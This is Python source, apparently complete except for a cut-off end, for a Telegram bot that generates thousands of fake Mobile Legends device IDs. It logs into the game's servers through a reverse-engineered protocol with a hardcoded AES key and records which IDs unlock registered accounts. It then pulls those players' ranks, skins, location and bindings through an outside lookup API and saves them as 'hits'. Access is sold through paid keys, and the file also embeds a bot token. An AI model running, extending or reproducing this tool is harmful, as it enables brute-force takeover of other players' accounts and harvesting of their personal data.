#!/usr/bin/env python3
# ===================================================================
# KYOHAX DEV ID CHECKER — Telegram Bot v1.0
# -------------------------------------------------------------------
#   • Ported from checker.py (CLI) → Telegram
#   • Uses external lookup API (mlbbbbv2.onrender.com/lookup)
#   • Bulk Check (file), Single Check, Generate + Check
#   • Key system + admin panel (owner-only)
#   • Clean Railway logs (WARNING level only)
#   • Watermark: @SHINRT771
# ===================================================================

import os, sys, time, random, uuid, json, threading, socket, zlib, io
import struct, re, logging, asyncio, zipfile, shutil, hashlib, string
from typing import Tuple, Dict, Any, List, Optional, Union
from pathlib import Path
from datetime import datetime, timezone, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import deque

import requests
import urllib3
import zstandard as zstd
from Crypto.Cipher import AES

from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup, BotCommand, InputFile
)
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    CallbackQueryHandler, ContextTypes, filters
)
from telegram.error import NetworkError, BadRequest
from telegram.request import HTTPXRequest

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ────────────────────────────────────────────────────────────────
# LOGGING  — WARNING only (Railway friendly)
# ────────────────────────────────────────────────────────────────

logging.basicConfig(
    level=logging.WARNING,
    format="%(asctime)s | %(levelname)-7s | %(message)s",
    datefmt="%H:%M:%S",
)
for noisy in ("httpx", "httpcore", "telegram", "telegram.ext",
              "telegram.request", "telegram.bot", "apscheduler",
              "urllib3", "asyncio"):
    logging.getLogger(noisy).setLevel(logging.CRITICAL)
log = logging.getLogger("kyohaxbot")
log.setLevel(logging.WARNING)

# ────────────────────────────────────────────────────────────────
# CONFIG
# ────────────────────────────────────────────────────────────────

BOT_TOKEN   = "8728762913:AAFdnTyiBUuhZiwGQ1FxgbgSb9Y_B1HovXY"
OWNER_ID    = 8621676055
BOT_NAME    = "KYOHAX DEV ID CHECKER"
BOT_VERSION = "1.0"
BRAND       = "@SHINRT771"

REQUIRED_CHANNELS = [
    {"name": "Codm And Mlbb",   "url": "https://t.me/CodmAndMlbb",    "id": "@CodmAndMlbb"},
    {"name": "Etoshim",         "url": "https://t.me/etoshim",        "id": "@etoshim"},
    {"name": "Shin Discussion", "url": "https://t.me/ShinDisscussion", "id": "@ShinDisscussion"},
]

TELEGRAM_CONNECT_TIMEOUT = 60.0
TELEGRAM_READ_TIMEOUT    = 60.0
TELEGRAM_WRITE_TIMEOUT   = 60.0
TELEGRAM_POOL_TIMEOUT    = 60.0

# Bulk limits — matches checker.py's 1–20 default 5
MAX_BULK_THREADS_DEFAULT = 5
MAX_BULK_THREADS_LIMIT   = 20
MIN_BULK_THREADS         = 1
MAX_GENERATE_COUNT       = 10000

TZ_WIB = timezone(timedelta(hours=7))
BASE_DIR    = os.path.dirname(os.path.abspath(__file__))
DATA_DIR    = os.path.join(BASE_DIR, "data")
RESULTS_DIR = os.path.join(BASE_DIR, "Results")

for d in (DATA_DIR, RESULTS_DIR):
    os.makedirs(d, exist_ok=True)

USERS_FILE = Path(DATA_DIR) / "users.json"
KEYS_FILE  = Path(DATA_DIR) / "keys.json"

# ────────────────────────────────────────────────────────────────
# MLBB PROTOCOL CONSTANTS  (from checker.py)
# ────────────────────────────────────────────────────────────────

AES_KEY        = bytes.fromhex('f5a193d50ade553e9835595f5cd75ddd')
AES_IV         = b'\x00' * 16
SERVER_HOST    = 'login.ml.youngjoygame.com'
SERVER_PORT    = 30021
CLIENT_VERSION = '2.1.61.1173.1'
CHANNEL_AND    = 'and_usa'

# ────────────────────────────────────────────────────────────────
# SDP PROTOCOL  (ported from checker.py)
# ────────────────────────────────────────────────────────────────

class SdpDataType:
    INTEGER_POSITIVE = 0
    INTEGER_NEGATIVE = 1
    FLOAT = 2
    DOUBLE = 3
    STRING = 4
    LIST = 5
    DICT = 6
    STRUCT_BEGIN = 7
    STRUCT_END = 8

class SdpException(Exception):
    def __init__(self, message):
        self.message = message
        super().__init__(self.message)

class SdpStruct(dict):
    def __init__(self, data=None):
        super().__init__()
        self.data = b''
        self.offset = 0
        if isinstance(data, bytes):
            self.data = data
            self.offset = 0
            self._unpack_from_binary()
        elif data is not None:
            super().update(data)
            self._pack_to_binary()

    def _pack_to_binary(self):
        self.data = bytes([SdpDataType.STRUCT_BEGIN << 4])
        for tag, value in sorted(self.items()):
            self._pack(tag, value)
        self.data += bytes([SdpDataType.STRUCT_END << 4])

    def _unpack_from_binary(self):
        if not self.data:
            return
        if self.data[0] >> 4 == SdpDataType.STRUCT_BEGIN:
            self.offset = 1
        while self.offset < len(self.data):
            tag, value = self._unpack()
            if value == SdpDataType.STRUCT_END:
                break
            self[tag] = value

    def _write_number(self, value: int) -> bytes:
        result = bytearray()
        while value >= 0x80:
            result.append((value & 0x7F) | 0x80)
            value >>= 7
        result.append(value & 0x7F)
        return bytes(result)

    def _read_number(self) -> int:
        n = 1
        val = self.data[self.offset] & 0x7F
        while self.data[self.offset + n - 1] >= 0x80:
            val |= (self.data[self.offset + n] & 0x7F) << (7 * n)
            n += 1
        self.offset += n
        return val

    def _pack_header(self, tag: int, data_type: int) -> None:
        if tag < 15:
            self.data += bytes([(data_type << 4) | tag])
        else:
            self.data += bytes([(data_type << 4) | 15])
            self.data += self._write_number(tag)

    def _pack(self, tag: int, value: Any) -> None:
        if isinstance(value, bool):
            self._pack_header(tag, SdpDataType.INTEGER_POSITIVE)
            self.data += self._write_number(1 if value else 0)
        elif isinstance(value, int):
            if value < 0:
                self._pack_header(tag, SdpDataType.INTEGER_NEGATIVE)
                self.data += self._write_number(-value)
            else:
                self._pack_header(tag, SdpDataType.INTEGER_POSITIVE)
                self.data += self._write_number(value)
        elif isinstance(value, float):
            self._pack_header(tag, SdpDataType.DOUBLE)
            packed = struct.pack("<d", value)
            self.data += self._write_number(len(packed))
            self.data += packed
        elif isinstance(value, (str, bytes)):
            self._pack_header(tag, SdpDataType.STRING)
            encoded = value.encode('utf-8') if isinstance(value, str) else value
            self.data += self._write_number(len(encoded))
            self.data += encoded
        elif isinstance(value, list):
            self._pack_header(tag, SdpDataType.LIST)
            self.data += self._write_number(len(value))
            for item in value:
                self._pack(0, item)
        elif isinstance(value, dict):
            if isinstance(value, SdpStruct):
                self._pack_header(tag, SdpDataType.STRUCT_BEGIN)
                for k, v in sorted(value.items()):
                    self._pack(k, v)
                self.data += bytes([SdpDataType.STRUCT_END << 4])
            else:
                self._pack_header(tag, SdpDataType.DICT)
                self.data += self._write_number(len(value))
                for k, v in sorted(value.items()):
                    self._pack(0, k)
                    self._pack(0, v)
        else:
            raise SdpException(f"Unsupported type: {type(value)}")

    def _unpack(self) -> Tuple[int, Any]:
        try:
            if self.offset >= len(self.data):
                return 0, None
            header = self.data[self.offset]
            tag = header & 0xF
            data_type = header >> 4
            self.offset += 1
            if tag == 15:
                tag = self._read_number()
            if data_type == SdpDataType.INTEGER_POSITIVE:
                return tag, self._read_number()
            elif data_type == SdpDataType.INTEGER_NEGATIVE:
                return tag, -self._read_number()
            elif data_type == SdpDataType.FLOAT:
                value = self._read_number().to_bytes(4, 'little')
                return tag, struct.unpack("<f", value)[0]
            elif data_type == SdpDataType.DOUBLE:
                value = self._read_number().to_bytes(8, 'little')
                return tag, struct.unpack("<d", value)[0]
            elif data_type == SdpDataType.STRING:
                length = self._read_number()
                raw = self.data[self.offset:self.offset + length]
                self.offset += length
                try:
                    value = raw.decode('utf-8')
                except UnicodeDecodeError:
                    value = raw
                return tag, value
            elif data_type == SdpDataType.LIST:
                length = self._read_number()
                value = []
                for _ in range(length):
                    _, item = self._unpack()
                    value.append(item)
                return tag, value
            elif data_type == SdpDataType.DICT:
                length = self._read_number()
                value = {}
                for _ in range(length):
                    _, k = self._unpack()
                    _, v = self._unpack()
                    value[k] = v
                return tag, value
            elif data_type == SdpDataType.STRUCT_BEGIN:
                struct_data = {}
                while True:
                    sub_tag, sub_value = self._unpack()
                    if sub_value == SdpDataType.STRUCT_END:
                        break
                    struct_data[sub_tag] = sub_value
                return tag, SdpStruct(struct_data)
            elif data_type == SdpDataType.STRUCT_END:
                return tag, SdpDataType.STRUCT_END
            else:
                raise SdpException(f"Unknown data type: {data_type}")
        except Exception as e:
            raise SdpException(f"Error unpacking data: {e}")

    def __repr__(self):
        return f"SdpStruct({dict(self)})"

    def copy(self):
        return SdpStruct(super().copy())

# ────────────────────────────────────────────────────────────────
# GAME CONNECTION  (ported from checker.py)
# ────────────────────────────────────────────────────────────────

class BaseConnection:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.sequence = 1
        self.socket = None
        self.queue_data = b''
        self.last_header_size = 0

    def __enter__(self):
        self.connect()
        return self

    def __exit__(self, exc_type, exc, tb):
        self.cleanup()

    def connect(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.settimeout(8)
        self.socket.connect((self.host, self.port))
        self.socket.settimeout(5)

    def cleanup(self):
        if self.socket:
            try: self.socket.close()
            except Exception: pass
            self.sequence = 1
            self.socket = None

    def send_data(self, packet_id, sdp):
        packet = SdpStruct({0: packet_id, 1: self.sequence, 5: sdp.data}).data
        buf = zstd.compress(packet)
        flags = (len(buf) + 4) | (16 << 24)
        buf = flags.to_bytes(4, 'big') + buf
        self.socket.send(buf)
        self.sequence += 1

    def recv_data(self):
        try:
            while len(self.queue_data) < 4:
                data = self.socket.recv(4096)
                if not data:
                    return None, None
                self.queue_data += data

            flags = int.from_bytes(self.queue_data[:4], 'big')
            size = flags & 0xFFFFFF
            compression_type = flags >> 24
            self.last_header_size = size

            while len(self.queue_data) < size:
                data = self.socket.recv(4096)
                if not data:
                    return None, None
                self.queue_data += data

            data = self.queue_data[4:size]
            self.queue_data = self.queue_data[size:]

            if compression_type == 16:
                data = zstd.decompress(data)
            elif compression_type == 2:
                cipher = AES.new(AES_KEY, AES.MODE_CBC, iv=AES_IV)
                data = cipher.decrypt(data).rstrip(b'\x00')
            elif compression_type == 3:
                cipher = AES.new(AES_KEY, AES.MODE_CBC, iv=AES_IV)
                data = zlib.decompress(cipher.decrypt(data).rstrip(b'\x00'))
            elif compression_type == 18:
                cipher = AES.new(AES_KEY, AES.MODE_CBC, iv=AES_IV)
                data = zstd.decompress(cipher.decrypt(data).rstrip(b'\x00'))
            elif compression_type == 1:
                data = zlib.decompress(data)

            result = SdpStruct(data)
            packet_id = result[0]
            if packet_id is None:
                return None, None

            res = result.get(6, result.get(5, None))
            if not res or not isinstance(res, bytes):
                return packet_id, None
            return packet_id, SdpStruct(res)

        except socket.timeout:
            return -1, None
        except Exception:
            return None, None


class GameConnection(BaseConnection):
    def __init__(self, device_id):
        super().__init__(SERVER_HOST, SERVER_PORT)
        self.device_id = device_id
        parts = self.device_id.split('_')
        if len(parts) >= 2:
            device_info = parts[1]
            if len(device_info) >= 32:
                self.imei_md5 = device_info[:32]
                self.android_id = device_info[32:48] if len(device_info) >= 48 else ""
                self.advertising_id = device_info[48:] if len(device_info) > 48 else ""
            else:
                self.imei_md5 = device_info
                self.android_id = ""
                self.advertising_id = ""
        else:
            self.imei_md5 = device_id
            self.android_id = ""
            self.advertising_id = ""

        self.channel = CHANNEL_AND
        self.client_version = CLIENT_VERSION
        self.account_id = 0
        self.session_key = ''
        self.zone_id = 0
        self.game_server_host = ''
        self.game_server_port = 0
        self.creation_ts = 0
        self.is_registered = False
        self.login_success = False

    def login_with_device(self):
        if self.host != SERVER_HOST or self.port != SERVER_PORT:
            self.cleanup()
            self.host = SERVER_HOST
            self.port = SERVER_PORT
            self.connect()

        self.send_data(1, SdpStruct({
            0: self.device_id,
            1: f'gps_adid={self.advertising_id}&android_id={self.android_id}&device_unique_id={self.imei_md5}',
            2: self.client_version,
            3: self.channel,
            4: 'en'
        }))

        id, res = self.recv_data()
        if id == 2 and res:
            self.account_id = res.get(0)
            self.session_key = res.get(1)
            self.zone_id = res.get(2, [0])[0] if res.get(2) else 0
            self.creation_ts = res.get(19, 0)
            acc_str = str(self.account_id)
            if acc_str.startswith('221') or acc_str.startswith('222'):
                self.is_registered = False
                self.login_success = False
                return False
            self.is_registered = True
            self.login_success = True
            return True
        self.login_success = False
        return False

    def get_game_server(self):
        self.send_data(5, SdpStruct({
            0: self.account_id,
            1: self.session_key,
            2: self.client_version,
            5: self.zone_id,
            6: self.channel
        }))
        id, res = self.recv_data()
        if id == 6 and res:
            game_server = res[1]
            if isinstance(game_server, bytes):
                game_server = game_server.decode('utf-8', errors='ignore')
            self.game_server_host, self.game_server_port = game_server.split(':')
            self.game_server_port = int(self.game_server_port)
            return True
        return False

    def connect_to_game_server(self):
        self.cleanup()
        self.host = self.game_server_host
        self.port = self.game_server_port
        self.connect()

        self.send_data(10001, SdpStruct({
            0: self.account_id,
            1: self.session_key,
            2: self.zone_id,
            4: self.client_version,
            13: self.channel,
            15: self.device_id
        }))

        self.send_data(10101, SdpStruct({0: 0, 2: 2}))

        for _ in range(30):
            id, res = self.recv_data()
            if id == 10002:
                return True
            elif id == 20001:
                continue
            elif id == -1:
                return False
            elif id is None:
                return False
        return False

    def __enter__(self):
        super().__enter__()
        login_success = self.login_with_device()
        if not login_success:
            return self
        if not self.get_game_server():
            raise ConnectionError("SERVER_SELECTION_FAILED")
        if not self.connect_to_game_server():
            raise ConnectionError("GAME_SERVER_FAILED")
        return self

# ────────────────────────────────────────────────────────────────
# LOOKUP API  (ported from checker.py)
# ────────────────────────────────────────────────────────────────

LOOKUP_API_URL     = "https://mlbbbbv2.onrender.com/lookup"
LOOKUP_TIMEOUT     = 60
LOOKUP_RETRIES     = 3
LOOKUP_BACKOFF     = 1.0
LOOKUP_BACKOFF_MAX = 60.0


def _lookup_jitter(attempt: int) -> float:
    return min(LOOKUP_BACKOFF * (2 ** attempt) + 0.5 * random.random(), LOOKUP_BACKOFF_MAX)


def _lookup_player(account_id, zone_id) -> Dict[str, Any]:
    payload = {"role_id": str(account_id), "zone_id": str(zone_id)}

    for attempt in range(LOOKUP_RETRIES + 1):
        try:
            resp = requests.post(LOOKUP_API_URL, json=payload, timeout=LOOKUP_TIMEOUT)

            if resp.status_code == 429:
                retry_after = 5
                try: retry_after = int(resp.headers.get("Retry-After", 5))
                except (ValueError, TypeError): pass
                try:
                    body = resp.json()
                    if body.get("retry_after"):
                        retry_after = int(body["retry_after"])
                except Exception: pass
                if attempt < LOOKUP_RETRIES:
                    time.sleep(_lookup_jitter(attempt))
                    continue
                return {"status": "error", "error": f"rate_limited_{retry_after}s"}

            if resp.status_code >= 500 and attempt < LOOKUP_RETRIES:
                time.sleep(_lookup_jitter(attempt))
                continue

            if resp.status_code == 400: return {"status": "error", "error": "bad_request"}
            if resp.status_code == 404: return {"status": "error", "error": "not_found"}
            if resp.status_code >= 400: return {"status": "error", "error": f"http_{resp.status_code}"}

            try: data = resp.json()
            except ValueError: return {"status": "error", "error": "invalid_json"}

            if data.get("status") == "success":
                pd = data.get("player_data")
                if not isinstance(pd, dict):
                    return {"status": "error", "error": "missing_player_data"}
                return {"status": "success", "player_data": pd}

            return {"status": "error", "error": data.get("error", "upstream_error")}

        except requests.exceptions.Timeout:
            if attempt < LOOKUP_RETRIES:
                time.sleep(_lookup_jitter(attempt))
                continue
            return {"status": "error", "error": "timeout"}
        except requests.exceptions.ConnectionError:
            if attempt < LOOKUP_RETRIES:
                time.sleep(_lookup_jitter(attempt))
                continue
            return {"status": "error", "error": "connection_error"}
        except Exception as exc:
            return {"status": "error", "error": f"unexpected: {str(exc)[:120]}"}

    return {"status": "error", "error": "max_retries_exceeded"}


class FullInfoLookup:
    def lookup(self, role_id, zone_id) -> Dict[str, Any]:
        raw = _lookup_player(role_id, zone_id)
        if raw.get("status") == "success":
            return {
                "status": "success",
                "player_data": self._normalize_player_data(raw.get("player_data", {})),
            }
        return {"status": "error", "error": raw.get("error", "unknown_lookup_error")}

    def _normalize_player_data(self, data: Dict[str, Any]) -> Dict[str, Any]:
        def safe_int(value, default=0):
            try:
                if value is None: return default
                return int(value)
            except (ValueError, TypeError): return default

        def safe_str(value, default="—"):
            if value is None: return default
            try:
                s = str(value).strip()
                return s if s else default
            except Exception: return default

        sb = data.get("skin_breakdown", {})
        if not isinstance(sb, dict): sb = {}

        return {
            "player_id":          safe_str(data.get("player_id")),
            "nickname":           safe_str(data.get("nickname")),
            "level":              safe_int(data.get("level")),
            "hero_count":         safe_int(data.get("hero_count")),
            "skin_count":         safe_int(data.get("skin_count")),
            "skin_breakdown": {
                "Supreme":     safe_int(sb.get("Supreme")),
                "Grand":       safe_int(sb.get("Grand")),
                "Exquisite":   safe_int(sb.get("Exquisite")),
                "Deluxe":      safe_int(sb.get("Deluxe")),
                "Exceptional": safe_int(sb.get("Exceptional")),
                "Common":      safe_int(sb.get("Common")),
            },
            "current_rank":       safe_str(data.get("current_rank")),
            "high_rank":          safe_str(data.get("high_rank")),
            "location":           safe_str(data.get("location"), "NOT FOUND"),
            "last_login":         safe_str(data.get("last_login")),
            "achievement_points": safe_int(data.get("achievement_points")),
            "collector_point":    safe_int(data.get("collector_point")),
            "collector_tier":     safe_str(data.get("collector_tier")),
            "squad":              safe_str(data.get("squad")),
            "bindings":           safe_str(data.get("bindings")),
            "win_rate":           safe_int(data.get("win_rate"), 0),
            "matches":            safe_int(data.get("matches")),
            "mvp":                safe_int(data.get("mvp")),
            "top_heroes":         data.get("top_heroes", []),
            "hero_history":       data.get("hero_history", []),
        }


_lookup_client = None
_lookup_lock = threading.Lock()

def get_lookup_client():
    global _lookup_client
    with _lookup_lock:
        if _lookup_client is None:
            _lookup_client = FullInfoLookup()
        return _lookup_client

# ────────────────────────────────────────────────────────────────
# DEVICE GENERATOR  (ported from checker.py)
# ────────────────────────────────────────────────────────────────

class MLBBDeviceIDGenerator:
    def __init__(self):
        self.prefix = "and"
        self.separator = "_"

    def generate_md5(self, seed=None) -> str:
        if seed is None:
            seed = str(uuid.uuid4()) + str(random.random()) + str(datetime.now().timestamp())
        return hashlib.md5(seed.encode()).hexdigest()

    def generate_android_id(self) -> str:
        return ''.join(random.choices('0123456789abcdef', k=16))

    def _generate_android_advertising_id(self) -> str:
        return '-'.join([
            ''.join(random.choices('0123456789abcdef', k=8)),
            ''.join(random.choices('0123456789abcdef', k=4)),
            ''.join(random.choices('0123456789abcdef', k=4)),
            ''.join(random.choices('0123456789abcdef', k=4)),
            ''.join(random.choices('0123456789abcdef', k=12))
        ])

    def generate_smart(self, count=1) -> list:
        results = []
        for _ in range(count):
            android_id = self.generate_android_id()
            adv_types = [
                lambda: str(uuid.uuid4()),
                lambda: f"{uuid.uuid4().hex[:8]}-{uuid.uuid4().hex[:4]}-{uuid.uuid4().hex[:4]}-{uuid.uuid4().hex[:4]}-{uuid.uuid4().hex[:12]}",
                lambda: self._generate_android_advertising_id()
            ]
            advertising_id = random.choice(adv_types)()
            imei_seed = f"{android_id}{advertising_id}{random.randint(100000000, 999999999)}{uuid.uuid4()}"
            imei_md5 = self.generate_md5(imei_seed)
            device_id = f"{self.prefix}_{imei_md5}{android_id}{advertising_id}"
            results.append(device_id)
        return results

# ────────────────────────────────────────────────────────────────
# LOOKUP BY DEVICE  (ported from checker.py)
# ────────────────────────────────────────────────────────────────

def lookup_by_device_id(device_id):
    try:
        with GameConnection(device_id=device_id) as conn:
            if not conn.login_success or not conn.is_registered:
                return {
                    'status': 'unregistered',
                    'device_id': device_id,
                    'message': 'UNREGISTERED',
                    'account_id': None,
                    'zone_id': None,
                    'is_registered': False
                }
            client = get_lookup_client()
            lr = client.lookup(conn.account_id, conn.zone_id)
            result = {
                'status': 'registered',
                'device_id': device_id,
                'account_id': conn.account_id,
                'zone_id': conn.zone_id,
                'message': f'REGISTERED | Account: {conn.account_id} Zone: {conn.zone_id}',
                'is_registered': True
            }
            if lr.get('status') == 'success':
                result['lookup_status'] = 'success'
                result['player_data'] = lr.get('player_data', {})
            else:
                result['lookup_status'] = 'error'
                result['lookup_error'] = lr.get('error', 'Unknown API error')
                result['player_data'] = {}
            return result
    except ConnectionError as e:
        return {'status': 'error', 'error': f'Connection error: {str(e)}', 'device_id': device_id}
    except Exception as e:
        return {'status': 'error', 'error': f'Error: {str(e)}', 'device_id': device_id}

# ────────────────────────────────────────────────────────────────
# RESULTS MANAGER  (session-scoped for Telegram)
# ────────────────────────────────────────────────────────────────

class TelegramResultsManager:
    """Saves results into a session directory; zip after job finishes."""
    def __init__(self, session_dir: str, session_name: str):
        self.base = Path(session_dir)
        self.session_name = session_name
        self.ts = datetime.now().strftime('%Y%m%d_%H%M%S')
        for sub in ('Registered', 'Unregistered', 'LookupErrors'):
            (self.base / sub).mkdir(parents=True, exist_ok=True)
        self._lock = threading.Lock()
        self._counter = 0

    def _next_index(self):
        with self._lock:
            self._counter += 1
            return self._counter

    def _format_entry(self, data, index):
        did = str(data.get('device_id', 'N/A'))
        acc = str(data.get('account_id', 'N/A'))
        zn  = str(data.get('zone_id', 'N/A'))
        reg = data.get('is_registered', False)
        pd  = data.get('player_data', {}) or {}
        ls  = data.get('lookup_status', 'N/A')

        lines = [
            '-' * 60,
            f'[{index}] DEVICE INFO',
            f'Device ID: {did}',
            f'Account ID: {acc}',
            f'Zone ID: {zn}',
            f'Status: {"REGISTERED" if reg else "UNREGISTERED"}',
            f'Lookup: {ls}',
            '-' * 60,
        ]
        if pd and reg:
            sb = pd.get("skin_breakdown", {}) or {}
            lines += [
                'PLAYER INFO',
                f'Nickname: {pd.get("nickname", "—")}',
                f'Level: {pd.get("level", "—")}',
                f'Heroes: {pd.get("hero_count", "—")}',
                f'Skins: {pd.get("skin_count", "—")}',
                f'Current Rank: {pd.get("current_rank", "—")}',
                f'Highest Rank: {pd.get("high_rank", "—")}',
                f'Win Rate: {pd.get("win_rate", "—")}%',
                f'Matches: {pd.get("matches", "—")}',
                f'MVP: {pd.get("mvp", "—")}',
                '-' * 60,
                'COLLECTION',
                f'Collector: {pd.get("collector_tier", "—")}',
                f'Collector Pts: {pd.get("collector_point", "—")}',
                f'Supreme: {sb.get("Supreme", "—")}',
                f'Grand: {sb.get("Grand", "—")}',
                f'Exquisite: {sb.get("Exquisite", "—")}',
                f'Deluxe: {sb.get("Deluxe", "—")}',
                f'Exceptional: {sb.get("Exceptional", "—")}',
                f'Common: {sb.get("Common", "—")}',
                '-' * 60,
                'OTHER INFO',
                f'Location: {pd.get("location", "—")}',
                f'Last Login: {pd.get("last_login", "—")}',
                f'Squad: {pd.get("squad", "—")}',
                f'Bindings: {pd.get("bindings", "—")}',
                f'Achievement Pts: {pd.get("achievement_points", "—")}',
                '-' * 60,
            ]
        lines.append('')
        return '\n'.join(lines)

    def add(self, data):
        did = str(data.get('device_id', 'N/A'))
        entry = self._format_entry(data, self._next_index())
        reg = data.get('is_registered', False)
        ls  = data.get('lookup_status', 'N/A')

        with self._lock:
            try:
                with open(self.base / f'All_Devices_{self.ts}.txt', 'a', encoding='utf-8', errors='replace') as f:
                    f.write(entry)
                if reg:
                    with open(self.base / 'Registered' / f'FullInfo_{self.ts}.txt', 'a', encoding='utf-8', errors='replace') as f:
                        f.write(entry)
                    acc = data.get('account_id', 'N/A')
                    zn  = data.get('zone_id', 'N/A')
                    pd  = data.get('player_data', {}) or {}
                    clean = (f"Device ID: {did} | Role ID: {acc} | Server ID: {zn}"
                             f" | Name: {pd.get('nickname', '—')} | Level: {pd.get('level', '—')} | Skins: {pd.get('skin_count', '—')}")
                    with open(self.base / 'Registered' / f'Accounts_Clean_{self.ts}.txt', 'a', encoding='utf-8', errors='replace') as f:
                        f.write(clean + '\n')
                else:
                    with open(self.base / 'Unregistered' / f'Unregistered_{self.ts}.txt', 'a', encoding='utf-8', errors='replace') as f:
                        f.write(entry)
                if ls == 'error':
                    with open(self.base / 'LookupErrors' / f'lookup_errors_{self.ts}.txt', 'a', encoding='utf-8', errors='replace') as f:
                        f.write(f"{did} | ERROR: {data.get('lookup_error', 'Unknown')}\n")
            except Exception:
                pass

# ────────────────────────────────────────────────────────────────
# USER MANAGER
# ────────────────────────────────────────────────────────────────

active_jobs = {}
job_lock = threading.Lock()

class UserManager:
    def __init__(self): self._load()

    def _load(self):
        try:
            self.users = json.loads(USERS_FILE.read_text()) if USERS_FILE.exists() else {"users": {}}
            if "users" not in self.users: self.users = {"users": {}}
        except Exception:
            self.users = {"users": {}}
        try:
            self.keys = json.loads(KEYS_FILE.read_text()) if KEYS_FILE.exists() else {"keys": {}}
            if "keys" not in self.keys: self.keys = {"keys": {}}
        except Exception:
            self.keys = {"keys": {}}
        self._su(); self._sk()

    def _su(self): USERS_FILE.write_text(json.dumps(self.users, indent=2))
    def _sk(self): KEYS_FILE.write_text(json.dumps(self.keys, indent=2))
    async def _save_users(self): self._su()
    async def _save_keys(self): self._sk()

    async def register_user(self, uid, u=None, f=None):
        k = str(uid)
        if k not in self.users["users"]:
            self.users["users"][k] = {
                "username": u, "first_name": f,
                "joined": datetime.now().isoformat(),
                "banned": False, "key_expiry": None,
                "threads_limit": MAX_BULK_THREADS_DEFAULT,
                "stats": {"total_checked": 0, "total_hits": 0},
                "activated": False,
            }
            await self._save_users()
            return True
        return False

    async def is_authorized(self, uid):
        k = str(uid)
        if k == str(OWNER_ID): return True, "admin"
        u = self.users["users"].get(k)
        if not u: return False, "not_registered"
        if u.get("banned"): return False, "banned"
        e = u.get("key_expiry")
        if e is None: return False, "no_key"
        try:
            if datetime.fromisoformat(e) < datetime.now(): return False, "key_expired"
        except Exception:
            return False, "invalid_expiry"
        return True, "ok"

    async def ban_user(self, uid):
        k = str(uid)
        if k in self.users["users"]:
            self.users["users"][k]["banned"] = True
            await self._save_users(); return True
        return False

    async def unban_user(self, uid):
        k = str(uid)
        if k in self.users["users"]:
            self.users["users"][k]["banned"] = False
            await self._save_users(); return True
        return False

    async def set_key_expiry(self, uid, dt):
        k = str(uid)
        if k not in self.users["users"]: return False
        self.users["users"][k]["key_expiry"] = dt.isoformat()
        self.users["users"][k]["activated"] = True
        await self._save_users(); return True

    async def generate_key(self, dur, unit, qty=1, mu=1):
        if unit in ('lifetime', 'l'):
            e = datetime(9999, 12, 31, 23, 59, 59); d = "Lifetime"
        else:
            um = {'s': 1, 'm': 60, 'h': 3600, 'd': 86400, 'y': 31536000,
                  'hours': 3600, 'days': 86400, 'months': 2592000}
            e = datetime.now() + timedelta(seconds=dur * um.get(unit.lower(), 86400))
            d = f"{dur} {unit}"
        ks = []
        for _ in range(qty):
            k = f"KYO-{uuid.uuid4().hex[:8].upper()}-{uuid.uuid4().hex[:8].upper()}"
            while k in self.keys["keys"]:
                k = f"KYO-{uuid.uuid4().hex[:8].upper()}-{uuid.uuid4().hex[:8].upper()}"
            self.keys["keys"][k] = {
                "created": datetime.now().isoformat(),
                "expiry": e.isoformat(),
                "used_by": [], "duration": d,
                "max_users": mu, "dtype": unit, "dval": dur,
            }
            ks.append(k)
        await self._save_keys()
        return ks, d

    async def redeem_key(self, uid, key):
        k = str(uid); kd = self.keys["keys"].get(key)
        if not kd: return False, "Invalid key"
        used = kd.get("used_by", [])
        if k in used: return False, "Key already used by you"
        if len(used) >= kd.get("max_users", 1): return False, "Key max users reached"
        e = datetime.fromisoformat(kd["expiry"])
        if e < datetime.now(): return False, "Key expired"
        used.append(k); kd["used_by"] = used
        await self._save_keys(); await self.set_key_expiry(uid, e)
        return True, f"Key redeemed! Valid until {e.strftime('%Y-%m-%d %H:%M')}"

    async def get_all_users(self): return self.users["users"]
    async def get_user_info(self, uid): return self.users["users"].get(str(uid))

    async def get_threads_limit(self, uid):
        u = self.users["users"].get(str(uid))
        if not u: return MAX_BULK_THREADS_DEFAULT
        try: tl = int(u.get("threads_limit", MAX_BULK_THREADS_DEFAULT) or MAX_BULK_THREADS_DEFAULT)
        except Exception: tl = MAX_BULK_THREADS_DEFAULT
        if tl < MIN_BULK_THREADS: tl = MIN_BULK_THREADS
        if tl > MAX_BULK_THREADS_LIMIT: tl = MAX_BULK_THREADS_LIMIT
        return tl

    async def update_stats(self, uid, checked=0, hits=0):
        k = str(uid); u = self.users["users"].get(k)
        if not u: return
        s = u.setdefault("stats", {})
        s["total_checked"] = s.get("total_checked", 0) + checked
        s["total_hits"] = s.get("total_hits", 0) + hits
        await self._save_users()

user_manager = UserManager()

# ────────────────────────────────────────────────────────────────
# LIVE STATS
# ────────────────────────────────────────────────────────────────

class LiveStats:
    def __init__(self, total):
        self.lock = threading.Lock()
        self.total = total
        self.checked = 0
        self.hits = 0
        self.invalid = 0
        self.errors = 0
        self.recent = deque(maxlen=200)
        self.start_ts = time.time()

    def inc(self, key, n=1):
        with self.lock:
            setattr(self, key, getattr(self, key) + n)
            if key == "checked":
                now = time.time()
                self.recent.append(now)

    def snapshot(self):
        with self.lock:
            now = time.time()
            elapsed = max(now - self.start_ts, 0.001)
            span = (self.recent[-1] - self.recent[0]) if len(self.recent) >= 2 else 0
            cnt  = (len(self.recent) - 1) if len(self.recent) >= 2 else 0
            live_rate = cnt / span if span > 0.5 else self.checked / elapsed
            avg_rate  = self.checked / elapsed
            rem = max(self.total - self.checked, 0)
            eta = rem / live_rate if live_rate > 0.01 else 0
            return {
                "total": self.total, "checked": self.checked,
                "hits": self.hits, "invalid": self.invalid,
                "errors": self.errors, "elapsed": elapsed,
                "avg_rate": avg_rate, "live_rate": live_rate, "eta": eta,
            }

# ────────────────────────────────────────────────────────────────
# DESIGN
# ────────────────────────────────────────────────────────────────

LINE_HEAVY = "━" * 28
LINE_DOT   = "┈" * 28

def panel_title(t): return f"◇  *{t.upper()}*  ◇\n{LINE_HEAVY}"

def _bar(pct, w=20):
    pct = max(0.0, min(100.0, pct))
    f = int(w * pct / 100)
    return "█" * f + "░" * (w - f)

def _fmt_secs(s):
    s = int(max(0, s))
    if s < 60: return f"{s}s"
